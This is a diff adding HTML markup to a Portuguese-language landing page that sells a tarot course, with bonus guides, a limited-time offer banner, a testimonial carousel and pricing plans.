+        <p class="text-gold-dark text-xs md:text-sm uppercase tracking-widest mb-10 md:mb-14 text-center">Conteúdo completo e estruturado para o seu aprendizado:</p>
+        <div class="flex flex-col lg:flex-row-reverse items-center gap-10 mb-20 max-w-5xl mx-auto">
+          <div class="w-full lg:w-1/2 flex justify-center">
+            <div class="relative w-full max-w-md aspect-[4/3] rounded-2xl overflow-hidden border border-gold-dark/30 shadow-2xl bg-black/5 group">
+              <div class="absolute top-0 left-0 w-6 h-6 border-t border-l border-gold-dark/30 rounded-tl-2xl pointer-events-none"></div>
+              <div class="absolute top-0 right-0 w-6 h-6 border-t border-r border-gold-dark/30 rounded-tr-2xl pointer-events-none"></div>
+              <div class="absolute bottom-0 left-0 w-6 h-6 border-b border-l border-gold-dark/30 rounded-bl-2xl pointer-events-none"></div>
+              <div class="absolute bottom-0 right-0 w-6 h-6 border-b border-r border-gold-dark/30 rounded-br-2xl pointer-events-none"></div>
+              
+              <img src="../i.postimg.cc/P5XD0PSs/2b1041d5-1fc7-4ea0-8361-591d27706951-(2).png" alt="Diário Completo de Leituras" class="w-full h-full object-cover rounded-2xl transform transition-transform duration-700 group-hover:scale-105" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            </div>
+          </div>
+          <div class="w-full lg:w-1/2 text-center lg:text-left flex flex-col justify-center">
+            <h3 class="text-xl xs:text-2xl font-serif font-bold text-bg-dark mb-1 uppercase tracking-wide">
+              Um Diário Completo para <span class="text-gold-dark italic">Registrar suas Leituras</span>
+            </h3>
+            <div class="flex items-center gap-2 mb-4 justify-center lg:justify-start">
+              <span class="text-xs line-through text-bg-dark/50 font-bold">De R$ 37,00</span>
+              <span class="text-xs font-bold text-gold-dark bg-gold-dark/10 px-2 py-0.5 rounded uppercase tracking-wider">Incluso Hoje</span>
+            </div>
+            <p class="text-sm md:text-base text-bg-dark/80 leading-relaxed mb-6">
+              Registre suas tiragens, organize interpretações e acompanhe sua evolução no Tarot. Aprenda com cada leitura e fortaleça sua intuição.
+            </p>
+            <div class="grid grid-cols-2 gap-4 max-w-sm mx-auto lg:mx-0">
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Registro das Tiragens</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Reflexões e Insights</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Evolução no Tarot</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Prática da Intuição</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex flex-col lg:flex-row items-center gap-10 mb-20 max-w-5xl mx-auto">
+          <div class="w-full lg:w-1/2 flex justify-center">
+            <div class="relative w-full max-w-md aspect-[4/3] rounded-2xl overflow-hidden border border-gold-dark/30 shadow-2xl bg-black/5 group">
+              <div class="absolute top-0 left-0 w-6 h-6 border-t border-l border-gold-dark/30 rounded-tl-2xl pointer-events-none"></div>
+              <div class="absolute top-0 right-0 w-6 h-6 border-t border-r border-gold-dark/30 rounded-tr-2xl pointer-events-none"></div>
+              <div class="absolute bottom-0 left-0 w-6 h-6 border-b border-l border-gold-dark/30 rounded-bl-2xl pointer-events-none"></div>
+              <div class="absolute bottom-0 right-0 w-6 h-6 border-b border-r border-gold-dark/30 rounded-br-2xl pointer-events-none"></div>
+              
+              <img src="../i.ibb.co/SXW4z64p/Design-sem-nome-37.png" alt="Guia de Astrologia e Mapa Astral" class="w-full h-full object-cover rounded-2xl transform transition-transform duration-700 group-hover:scale-105" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            </div>
+          </div>
+          <div class="w-full lg:w-1/2 text-center lg:text-left flex flex-col justify-center">
+            <h3 class="text-xl xs:text-2xl font-serif font-bold text-bg-dark mb-1 uppercase tracking-wide">
+              Guia de Astrologia e <span class="text-gold-dark italic">Mapa Astral</span>
+            </h3>
+            <div class="flex items-center gap-2 mb-4 justify-center lg:justify-start">
+              <span class="text-xs line-through text-bg-dark/50 font-bold">De R$ 47,00</span>
+              <span class="text-xs font-bold text-gold-dark bg-gold-dark/10 px-2 py-0.5 rounded uppercase tracking-wider">Incluso Hoje</span>
+            </div>
+            <p class="text-sm md:text-base text-bg-dark/80 leading-relaxed mb-6">
+              Aprenda a interpretar signos, planetas, casas astrológicas e mapas astrais de forma simples e prática — mesmo que você esteja começando agora.
+            </p>
+            <div class="grid grid-cols-2 gap-4 max-w-sm mx-auto lg:mx-0">
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Signos e Planetas Mapeados</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Casas Astrológicas</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Sinergia com Tarot</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Leitura Simplificada</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex flex-col lg:flex-row items-center gap-10 mb-16 md:mb-20 max-w-5xl mx-auto">
+          <div class="w-full lg:w-1/2 flex justify-center">
+            <div class="relative w-full max-w-md aspect-[4/3] rounded-2xl overflow-hidden border border-gold-dark/30 shadow-2xl bg-black/5 group">
+              <div class="absolute top-0 left-0 w-6 h-6 border-t border-l border-gold-dark/30 rounded-tl-2xl pointer-events-none"></div>
+              <div class="absolute top-0 right-0 w-6 h-6 border-t border-r border-gold-dark/30 rounded-tr-2xl pointer-events-none"></div>
+              <div class="absolute bottom-0 left-0 w-6 h-6 border-b border-l border-gold-dark/30 rounded-bl-2xl pointer-events-none"></div>
+              <div class="absolute bottom-0 right-0 w-6 h-6 border-b border-r border-gold-dark/30 rounded-br-2xl pointer-events-none"></div>
+              
+              <img src="../i.ibb.co/jvcQSZTW/Design-sem-nome-42.png" alt="Guia do Baralho Cigano" class="w-full h-full object-cover rounded-2xl transform transition-transform duration-700 group-hover:scale-105" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            </div>
+          </div>
+          <div class="w-full lg:w-1/2 text-center lg:text-left flex flex-col justify-center">
+            <h3 class="text-xl xs:text-2xl font-serif font-bold text-bg-dark mb-1 uppercase tracking-wide">
+              Guia do <span class="text-gold-dark italic">Baralho Cigano</span>
+            </h3>
+            <div class="flex items-center gap-2 mb-4 justify-center lg:justify-start">
+              <span class="text-xs line-through text-bg-dark/50 font-bold">De R$ 47,00</span>
+              <span class="text-xs font-bold text-gold-dark bg-gold-dark/10 px-2 py-0.5 rounded uppercase tracking-wider">Incluso Hoje</span>
+            </div>
+            <p class="text-sm md:text-base text-bg-dark/80 leading-relaxed mb-6">
+              Aprenda a interpretar com precisão as 36 cartas do Baralho Cigano. Um guia prático e visual para decifrar mensagens sobre amor, trabalho e caminhos com total clareza.
+            </p>
+            <div class="grid grid-cols-2 gap-4 max-w-sm mx-auto lg:mx-0">
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>As 36 Cartas Mapeadas</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Tradição Lenormand</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Combinações Diretas</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Respostas Objetivas</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex flex-col items-center px-4 max-w-3xl mx-auto">
+          <div class="relative w-full max-w-md aspect-[4/3] rounded-2xl overflow-hidden border border-gold-dark/30 shadow-2xl bg-black/5 group mb-6">
+            <div class="absolute top-0 left-0 w-6 h-6 border-t border-l border-gold-dark/30 rounded-tl-2xl pointer-events-none"></div>
+            <div class="absolute top-0 right-0 w-6 h-6 border-t border-r border-gold-dark/30 rounded-tr-2xl pointer-events-none"></div>
+            <div class="absolute bottom-0 left-0 w-6 h-6 border-b border-l border-gold-dark/30 rounded-bl-2xl pointer-events-none"></div>
+            <div class="absolute bottom-0 right-0 w-6 h-6 border-b border-r border-gold-dark/30 rounded-br-2xl pointer-events-none"></div>
+            
+            <img src="../i.ibb.co/d4T8NkDZ/283e0ad2-1546-4a80-be2a-8af69693291c.png" alt="Guia do Baralho de Maria Padilha" class="w-full h-full object-cover rounded-2xl transform transition-transform duration-700 group-hover:scale-105" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+          </div>
+          
+          <div class="text-center flex flex-col items-center">
+            <h3 class="text-xl xs:text-2xl font-serif font-bold text-bg-dark mb-1 uppercase tracking-wide">
+              Guia do Baralho de <span class="text-gold-dark italic">Maria Padilha</span>
+            </h3>
+            <div class="flex items-center gap-2 mb-4 justify-center">
+              <span class="text-xs line-through text-bg-dark/50 font-bold">De R$ 47,00</span>
+              <span class="text-xs font-bold text-gold-dark bg-gold-dark/10 px-2 py-0.5 rounded uppercase tracking-wider">Incluso Hoje</span>
+            </div>
+            <p class="text-sm md:text-base text-bg-dark/80 leading-relaxed mb-6 max-w-2xl">
+              Interprete as mensagens do Baralho de Maria Padilha com um guia visual, simples e prático para consultas sobre amor, proteção, caminhos e decisões do dia a dia.
+            </p>
+            <div class="grid grid-cols-2 gap-4 max-w-md w-full justify-items-center">
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Significados Práticos</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Conexão e Intuição</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Tiragens de Amor</span>
+              </div>
+              <div class="flex items-center gap-2 text-bg-dark/90 font-medium text-xs md:text-sm">
+                <i data-lucide="check" class="text-gold-dark w-4 h-4 shrink-0"></i>
+                <span>Proteção e Caminhos</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+    <section class="relative z-10 px-4 pt-20 pb-6 md:pt-28 md:pb-8 max-w-5xl mx-auto">
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-center">
+        <div>
+          <h2 class="text-xl xs:text-2xl md:text-3xl font-bold mb-4 text-red inline-block relative leading-snug">
+            Por que é difícil aprender Tarot sozinho?
+            <span class="absolute bottom-[-4px] left-0 w-full h-1 bg-red/30 rounded-full"></span>
+          </h2>
+          <ul class="space-y-3.5 mt-2">
+            <li class="flex items-start gap-2.5">
+              <i data-lucide="x-circle" class="text-red shrink-0 w-4.5 h-4.5 mt-0.5"></i>
+              <span class="text-white-soft/80 text-sm sm:text-base">Livros gigantescos com interpretações confusas e contraditórias</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <i data-lucide="x-circle" class="text-red shrink-0 w-4.5 h-4.5 mt-0.5"></i>
+              <span class="text-white-soft/80 text-sm sm:text-base">Múltiplos sistemas de tiragem complexos e difíceis de aplicar</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <i data-lucide="x-circle" class="text-red shrink-0 w-4.5 h-4.5 mt-0.5"></i>
+              <span class="text-white-soft/80 text-sm sm:text-base">Enorme barreira para associar as respostas e 'conectar as cartas'</span>
+            </li>
+          </ul>
+          <p class="mt-5 text-white-soft/60 text-xs xs:text-sm md:text-base italic bg-red/5 p-4 rounded-xl border-l-2 border-red/30 leading-relaxed">
+            A maioria desiste pois tenta memorizar cada detalhe em vez de abraçar a verdadeira intuição das cartas.
+          </p>
+        </div>
+        
+        <div class="p-6 xs:p-8 card-mystic bg-gold/5 border-gold/30">
+          <h2 class="text-xl xs:text-2xl md:text-3xl font-bold mb-4 text-gold">A Solução Definitiva</h2>
+          <p class="text-sm xs:text-base leading-relaxed text-white-soft/90 mb-4">
+            O <strong>Guia do Tarot</strong> foi estruturado para quebrar a teoria complexa. Nós simplificamos as associações e ensinamos de forma puramente visual.
+          </p>
+          <p class="text-sm xs:text-base leading-relaxed text-white-soft/90">
+            Você não vai passar meses tentando decorar. Você vai começar a <strong>dialogar</strong> com as cartas de imediato, mesmo sem dons sobrenaturais.
+          </p>
+        </div>
+      </div>
+    </section>
+    <section class="relative z-10 px-4 pt-6 pb-20 md:pt-8 md:pb-28 bg-gradient-to-b from-primary/15 to-transparent">
+      <div class="max-w-6xl mx-auto text-center">
+        <div class="mb-10 w-full overflow-hidden bg-red/10 border-y border-red/30 py-3 relative rounded-lg">
+          <div class="animate-marquee-loop flex gap-12 whitespace-nowrap">
+            <div class="flex items-center gap-12 shrink-0">
+              <span class="flex items-center gap-2.5 text-xs sm:text-sm font-bold text-white tracking-wide uppercase">
+                <i data-lucide="clock" class="w-4 h-4 text-red shrink-0"></i>
+                Atenção: Oferta por Tempo Limitado! <span class="text-gold font-extrabold">Somente Hoje</span> você ganhará estes Bônus Exclusivos!
+              </span>
+              <span class="text-red font-bold select-none">✦</span>
+            </div>
+            <div class="flex items-center gap-12 shrink-0">
+              <span class="flex items-center gap-2.5 text-xs sm:text-sm font-bold text-white tracking-wide uppercase">
+                <i data-lucide="clock" class="w-4 h-4 text-red shrink-0"></i>
+                Atenção: Oferta por Tempo Limitado! <span class="text-gold font-extrabold">Somente Hoje</span> você ganhará estes Bônus Exclusivos!
+              </span>
+              <span class="text-red font-bold select-none">✦</span>
+            </div>
+            <div class="flex items-center gap-12 shrink-0">
+              <span class="flex items-center gap-2.5 text-xs sm:text-sm font-bold text-white tracking-wide uppercase">
+                <i data-lucide="clock" class="w-4 h-4 text-red shrink-0"></i>
+                Atenção: Oferta por Tempo Limitado! <span class="text-gold font-extrabold">Somente Hoje</span> você ganhará estes Bônus Exclusivos!
+              </span>
+              <span class="text-red font-bold select-none">✦</span>
+            </div>
+          </div>
+        </div>
+        
+        <h2 class="text-2xl xs:text-3xl font-extrabold mb-3 text-white">Bônus Exclusivos</h2>
+        <p class="text-gold text-xs md:text-sm uppercase tracking-widest mb-10 md:mb-12">Adquirindo hoje, você leva gratuitamente:</p>
+        
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
+          <div class="p-6 xs:p-7 card-mystic relative overflow-hidden group flex flex-col items-center">
+            <div class="absolute top-0 left-0 bg-red text-white text-[10px] font-black px-3 py-1 rounded-br-lg tracking-wider uppercase z-10">EXCLUSIVO</div>
+            <div class="absolute top-0 right-0 bg-red text-white text-[10px] font-bold px-2.5 py-1 rounded-bl-lg animate-pulse">GRÁTIS</div>
+            <div class="mb-4 w-full max-w-[145px] xs:max-w-[165px] aspect-[3/4] overflow-hidden rounded-lg border border-gold/15 flex items-center justify-center p-2 bg-black/20">
+              <img src="../i.ibb.co/ch6VH4Jn/36bb0bf7-76bf-45e2-8374-9032c71c745f-removebg-preview.png" alt="Bônus 1" class="max-w-full max-h-full object-contain group-hover:scale-105 transition duration-300" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            </div>
+            <h4 class="text-base xs:text-lg font-bold mb-2 text-white">Os Segredos da Corte</h4>
+            <p class="text-xs xs:text-sm text-white-soft/70 mb-4 text-center">Mapeamento rápido para desvendar as figures da corte sem hesitar.</p>
+            <div class="mt-auto">
+              <div class="text-xs line-through text-white-soft/35">De R$ 47</div>
+              <div class="text-gold font-bold text-sm xs:text-base">Por R$ 0,00</div>
+            </div>
+          </div>
+          <div class="p-6 xs:p-7 card-mystic relative overflow-hidden group flex flex-col items-center">
+            <div class="absolute top-0 left-0 bg-red text-white text-[10px] font-black px-3 py-1 rounded-br-lg tracking-wider uppercase z-10">EXCLUSIVO</div>
+            <div class="absolute top-0 right-0 bg-red text-white text-[10px] font-bold px-2.5 py-1 rounded-bl-lg animate-pulse">GRÁTIS</div>
+            <div class="mb-4 w-full max-w-[145px] xs:max-w-[165px] aspect-[3/4] overflow-hidden rounded-lg border border-gold/15 flex items-center justify-center p-2 bg-black/20">
+              <img src="../i.ibb.co/Zp64BF1X/1c4db106-2257-40d7-b3f4-ed4833474122-removebg-preview.png" alt="Bônus 2" class="max-w-full max-h-full object-contain group-hover:scale-105 transition duration-300" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            </div>
+            <h4 class="text-base xs:text-lg font-bold mb-2 text-white">Tiragens Dinâmicas</h4>
+            <p class="text-xs xs:text-sm text-white-soft/70 mb-4 text-center">As principais formas de abrir a mesa para amor, dinheiro e caminhos.</p>
+            <div class="mt-auto">
+              <div class="text-xs line-through text-white-soft/35">De R$ 37</div>
+              <div class="text-gold font-bold text-sm xs:text-base">Por R$ 0,00</div>
+            </div>
+          </div>
+          <div class="p-6 xs:p-7 card-mystic relative overflow-hidden group flex flex-col items-center">
+            <div class="absolute top-0 left-0 bg-red text-white text-[10px] font-black px-3 py-1 rounded-br-lg tracking-wider uppercase z-10">EXCLUSIVO</div>
+            <div class="absolute top-0 right-0 bg-red text-white text-[10px] font-bold px-2.5 py-1 rounded-bl-lg animate-pulse">GRÁTIS</div>
+            <div class="mb-4 w-full max-w-[145px] xs:max-w-[165px] aspect-[3/4] overflow-hidden rounded-lg border border-gold/15 flex items-center justify-center p-2 bg-black/20">
+              <img src="../i.ibb.co/PsbgsMsF/5e063d5d-c5b8-4808-9419-bab56060a729-removebg-preview.png" alt="Bônus 3" class="max-w-full max-h-full object-contain group-hover:scale-105 transition duration-300" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            </div>
+            <h4 class="text-base xs:text-lg font-bold mb-2 text-white">Arcanos Menores Combinados</h4>
+            <p class="text-xs xs:text-sm text-white-soft/70 mb-4 text-center">Como interpretar a junção de duas ou mais cartas de forma fluida.</p>
+            <div class="mt-auto">
+              <div class="text-xs line-through text-white-soft/35">De R$ 27</div>
+              <div class="text-gold font-bold text-sm xs:text-base">Por R$ 0,00</div>
+            </div>
+          </div>
+          <div class="p-6 xs:p-7 card-mystic relative overflow-hidden group flex flex-col items-center">
+            <div class="absolute top-0 left-0 bg-red text-white text-[10px] font-black px-3 py-1 rounded-br-lg tracking-wider uppercase z-10">EXCLUSIVO</div>
+            <div class="absolute top-0 right-0 bg-red text-white text-[10px] font-bold px-2.5 py-1 rounded-bl-lg animate-pulse">GRÁTIS</div>
+            <div class="mb-4 w-full max-w-[145px] xs:max-w-[165px] aspect-[3/4] overflow-hidden rounded-lg border border-gold/15 flex items-center justify-center p-2 bg-black/20">
+              <img src="../i.ibb.co/Ngxx0Hvc/184fa605-8e89-47f6-bce4-0490c4513971-removebg-preview.png" alt="Bônus 4" class="max-w-full max-h-full object-contain group-hover:scale-105 transition duration-300" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            </div>
+            <h4 class="text-base xs:text-lg font-bold mb-2 text-white">Sagração e Rituais</h4>
+            <p class="text-xs xs:text-sm text-white-soft/70 mb-4 text-center">Ritual de abertura, limpeza, purificação e consagração do seu deck.</p>
+            <div class="mt-auto">
+              <div class="text-xs line-through text-white-soft/35">De R$ 37</div>
+              <div class="text-gold font-bold text-sm xs:text-base">Por R$ 0,00</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+      </div>
+    </section>
+    <section class="relative z-10 px-4 py-20 md:py-28 vintage-section">
+      <div class="max-w-4xl mx-auto">
+        <div class="text-center mb-12">
+          <p class="text-gold-dark font-extrabold uppercase tracking-[0.25em] mb-3 text-xs md:text-sm">DEPOIMENTOS DE ALUNOS</p>
+          <h2 class="text-2xl xs:text-3xl md:text-4xl font-poppins font-extrabold text-bg-dark uppercase tracking-tight leading-[0.92]">
+            QUEM JÁ <span class="text-gold-dark font-extrabold text-[1.05em] inline-block">APRENDEU</span> COM A GENTE
+          </h2>
+          <div class="w-[74px] h-[5px] bg-gold-dark/40 mx-auto mt-4 rounded-full"></div>
+        </div>
+        <div class="relative w-full max-w-[315px] sm:max-w-[350px] mx-auto flex flex-col items-center">
+          <div class="relative w-full rounded-2xl overflow-hidden border-2 border-gold-dark/20 shadow-2xl bg-black/5 aspect-[4/5] flex items-center justify-center">
+            <img src="../i.ibb.co/0VYKVKP9/IMG-6705.jpg" class="absolute inset-0 w-full h-full object-cover transition-all duration-300 opacity-100 scale-100" data-test-img="0" referrerpolicy="no-referrer" decoding="async" />
+            <img src="../i.ibb.co/BHkRb4kR/IMG-6708.jpg" class="absolute inset-0 w-full h-full object-cover transition-all duration-300 opacity-0 scale-95" data-test-img="1" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            <img src="../i.ibb.co/DPg4Mfzp/IMG-6710.jpg" class="absolute inset-0 w-full h-full object-cover transition-all duration-300 opacity-0 scale-95" data-test-img="2" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            <img src="../i.ibb.co/pjQBGwY6/IMG-6706.jpg" class="absolute inset-0 w-full h-full object-cover transition-all duration-300 opacity-0 scale-95" data-test-img="3" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            <img src="../i.ibb.co/v4vFdJNq/IMG-6704.jpg" class="absolute inset-0 w-full h-full object-cover transition-all duration-300 opacity-0 scale-95" data-test-img="4" referrerpolicy="no-referrer" loading="lazy" decoding="async" />
+            <div class="absolute inset-0 pointer-events-none border border-gold-dark/10 rounded-2xl"></div>
+          </div>
+          <button onclick="prevTestimonial()" class="absolute left-[-16px] sm:left-[-40px] top-1/2 -translate-y-1/2 w-8 h-8 rounded-full bg-[#f4e4bc]/90 hover:bg-[#f4e4bc] border border-gold-dark/30 text-gold-dark flex items-center justify-center transition-all shadow-md z-30 focus:outline-none">
+            <i data-lucide="chevron-left" class="w-4 h-4"></i>
+          </button>
+          <button onclick="nextTestimonial()" class="absolute right-[-16px] sm:right-[-40px] top-1/2 -translate-y-1/2 w-8 h-8 rounded-full bg-[#f4e4bc]/90 hover:bg-[#f4e4bc] border border-gold-dark/30 text-gold-dark flex items-center justify-center transition-all shadow-md z-30 focus:outline-none">
+            <i data-lucide="chevron-right" class="w-4 h-4"></i>
+          </button>
+          <div class="flex gap-2 mt-5 z-20" id="testimonial-dots">
+            <button onclick="setTestimonialIndex(0)" class="w-6 h-2 rounded-full bg-gold-dark transition-all duration-300" data-test-dot="0"></button>
+            <button onclick="setTestimonialIndex(1)" class="w-2 h-2 rounded-full bg-gold-dark/20 transition-all duration-300" data-test-dot="1"></button>
+            <button onclick="setTestimonialIndex(2)" class="w-2 h-2 rounded-full bg-gold-dark/20 transition-all duration-300" data-test-dot="2"></button>
+            <button onclick="setTestimonialIndex(3)" class="w-2 h-2 rounded-full bg-gold-dark/20 transition-all duration-300" data-test-dot="3"></button>
+            <button onclick="setTestimonialIndex(4)" class="w-2 h-2 rounded-full bg-gold-dark/20 transition-all duration-300" data-test-dot="4"></button>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="precos" class="relative z-10 px-4 py-20 md:py-28 max-w-5xl mx-auto scroll-mt-24">
+      <div class="text-center mb-10 md:mb-12">
+        <p class="text-gold font-extrabold uppercase tracking-[0.2em] mb-2 text-xs md:text-sm">GARANTA SEU ACESSO</p>
+        <h2 class="text-xl xs:text-2xl md:text-4xl font-serif font-bold text-gold-gradient uppercase tracking-wider mb-3 leading-snug">Escolha o Melhor Plano Para Você</h2>
+        <p class="text-xs xs:text-sm md:text-base text-white-soft/60 max-w-md mx-auto">Acesso vitalício imediato. Sem taxas periódicas ou assinaturas.</p>
+        <div class="w-12 h-1 bg-gold/30 mx-auto mt-4 rounded-full"></div>
+      </div>
+      
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-8 items-stretch max-w-4xl mx-auto">
+        <div class="card-mystic flex flex-col p-6 xs:p-8 md:p-10 border-lilac/20 bg-bg-dark/70 backdrop-blur-md relative overflow-hidden flex-1 hover:border-lilac/40 transition duration-300">
+          <div class="mb-4">
+            <span class="text-lilac text-[10px] uppercase tracking-widest font-extrabold bg-lilac/15 px-3.5 py-1 rounded-full border border-lilac/10">Iniciação</span>
+            <h3 class="text-lg xs:text-xl md:text-2xl font-serif font-bold mt-3 text-white">Acesso Essencial</h3>
+            <p class="text-xs xs:text-sm text-white-soft/50 mt-1">Essencial para compreender os primeiros passos</p>
+          </div>
+          
+          <div class="my-4">
+            <p class="text-white-soft/40 text-[10px] uppercase tracking-wider">Apenas hoje por</p>
+            <div class="flex items-baseline gap-1 mt-1">
+              <span class="text-base font-bold text-gold">R$</span>
+              <span class="text-3xl xs:text-4xl md:text-5xl font-serif font-bold text-gold">17,00</span>
+              <span class="text-white-soft/50 text-xs ml-1 font-sans">à vista</span>
+            </div>
+            <p class="text-xs text-white/95 mt-1 font-medium">ou em até <span class="text-gold font-bold">2x de R$ 5,31</span></p>
+            <div class="mt-3 flex items-center gap-1.5 text-gold bg-gold/15 border border-gold/20 px-3 py-1 rounded-lg w-fit">
+              <i data-lucide="sparkles" class="text-gold w-3.5 h-3.5 shrink-0"></i>
+              <span class="text-[10px] font-black uppercase tracking-wider">Acesso Vitalício</span>
+            </div>
+          </div>
+          
+          <div class="w-full h-px bg-white/5 my-3"></div>
+          
+          <ul class="space-y-3 mb-6 text-xs xs:text-sm md:text-base text-left flex-1">
+            <li class="flex items-start gap-2.5 text-white-soft/90">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Acesso completo ao Guia (Maiores e Menores)</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/90">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Significados profundos e dinâmicos</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/90">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Método visual para rápida absorção</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/90">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Acesso à Comunidade VIP de Aprendizado</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/90">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Material com Layout Otimizado de Alta Resolução</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/90">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Suporte padrão por e-mail</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Diário de Leituras</span>
+            </li>
+
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Guia do Baralho Cigano</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Guia de Astrologia e Mapa Astral</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Guia do Baralho de Maria Padilha</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Bônus: Tiragens Dinâmicas</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Bônus: Os Segredos da Corte</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Bônus: Arcanos Menores Combinados</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Bônus: Sagração e Rituais</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white-soft/30">
+              <i data-lucide="x-circle" class="text-white-soft/10 shrink-0 w-4 h-4 mt-0.5"></i>
+              <span class="line-through">Atualizações de conteúdo inclusas</span>
+            </li>
+          </ul>
+          
+          <button 
+            onclick="openUpsell()"
